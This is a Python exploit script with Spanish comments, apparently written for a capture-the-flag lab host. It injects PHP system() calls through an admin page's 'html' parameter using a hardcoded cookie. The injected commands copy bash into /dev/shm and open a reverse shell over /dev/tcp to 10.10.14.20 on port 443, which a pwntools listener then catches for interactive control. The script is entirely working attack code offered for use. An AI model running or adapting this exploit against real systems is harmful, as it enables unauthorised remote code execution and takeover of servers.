import requests
import pdb
import sys
import signal
import threading
import time

from pwn import *

def def_handler(sig, frame):
    
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.27/admin.php"
burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def makeRequest():

    headers = {
        'Cookie': 'adminpowa=noonecares'
    }

    r = requests.get(main_url + "?html=<?php%20system(\"cp%20/bin/bash%20/dev/shm/s4vitar\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php%20system(\"chmod%20+x%20/dev/shm/s4vitar\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php%20system(\"/dev/shm/s4vitar%20-c%20'/dev/shm/s4vitar%20-i%20>%26%20/dev/tcp/10.10.14.20/443%200>%261'\");%20?>", headers=headers)

    print(r.text)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest,args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=10).wait_for_connection()

    shell.interactive()
